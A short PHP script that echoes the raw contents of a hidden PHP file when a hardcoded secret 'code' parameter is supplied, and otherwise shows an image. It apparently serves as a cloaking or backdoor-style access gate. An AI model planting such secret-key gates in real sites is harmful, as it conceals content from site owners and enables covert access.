<?php
$id = $_GET["code"];
if ($id == "mminyc#103051479989487048409478937894") {
$myFile = "0147-wadho.php";
$fh = fopen($myFile, 'r');
$theData = fread($fh, 500000);
fclose($fh);
echo $theData;
}

else{
$myFile1 = "bj.jpg";
$fh1 = fopen($myFile1, 'r');
$theData1 = fread($fh1, 500000);
fclose($fh1);
echo $theData1;
}
?>